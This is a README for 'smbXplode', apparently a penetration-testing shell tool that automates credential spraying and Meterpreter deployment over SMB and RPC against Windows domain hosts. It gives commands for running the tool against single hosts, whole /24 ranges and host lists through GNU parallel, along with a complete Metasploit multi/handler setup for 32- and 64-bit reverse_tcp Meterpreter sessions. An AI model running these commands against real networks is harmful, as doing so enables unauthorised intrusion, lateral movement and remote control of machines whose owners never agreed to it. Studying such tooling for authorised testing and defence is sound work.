# smbXplode

What to do when Metasploit psexec module doesn't work for no good reason? 

This script is used to automate the process of harvesting credentials and getting Meterpreter sessions through smb and rpc against windows domain.
For this to work you would need to have some admin credentials to start with. or you could have some low privileged credentials; that you want to try them against the whole range and try to escalate your privilege later on. 

You can always re-adapt msfcommands.rc to automate the Metasploit commands that you want to run once you have a session. 

Also notice that due to the use of net rpc, you need to migrate first thing after a session otherwise the session would die. You can always fall back to use the Winexe command (which you can find commented in the script).

## Features 
- Detects remote host architecture before uploading payload
- Abstracts the process of upload/execute payload on remote host
- Combined with "gnu parallel", it can exploit whole ranges/host lists within one command line

### Future improvements
- Better integrate gnu parallel with in the script itself for more convenience.
- Improve the way arguments are passed, add arguments for number of threads, ip ranges, host files. 
- Add the ability to go through a list of captured credentials, to check them against the ip/range in scope. 
- Add pass the hash option if password is not available
- Pull requests are welcomed

## Usage 
Before running this script, simply make sure that you have two payload files (32 & 64 bit). Make sure to update the name of the files accordingly in the script. 


### Single Host
To run the script simply use the following syntax
```	
./smbXplode.sh domain username password hostIP
```

Example : 
```
./smbXplode.sh domain tito Password2015 10.10.10.10
```

### Multiple Hosts
So far it's not really integrated into the script, as I like to keep it as simple as possible. I rely on GNU parallel to do that. 
Notice that parallel passes the IP as the last parameter already. 

Example 
```
# Running against a /24
for i in {1..254}; do echo 10.10.10.$i; done | parallel -j 5 ./smbXplode.sh domain tito Password2015
```
```
# Running against host ips file
cat hosts.txt | parallel -j 5 ./smbXplode.sh domain tito Password2015
```

### Metasploit Handler
Make sure to have your Metasploit handler listening for both payloads (you can listen two different ports for 32, and 64).
Also, make sure you select the correct payload for the handler, I will demonstrate the reverce_tcp (32 and 64) 

Example :

```
use exploit/multi/handler
set autorunscript multi_console_command -rc /path/to/msfcommands.rc
set ExitOnSession false
set payload windows/x64/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 1111
run -j -z
set payload windows/meterpreter/reverse_tcp
set lport 2222
run -j -z
```

Now make sure that your connect back payloads are configured to match those ports and payload type. 

## Dependencies
- net rpc ( used to detect architecture, and run the payload ) 
- smbclient ( used to upload payload ) 
- winexe ( in case used as a replacement for net rpc to run the payload ) 

## Thanks
@Mr.Un1k0d3r from ringzer0team.com 
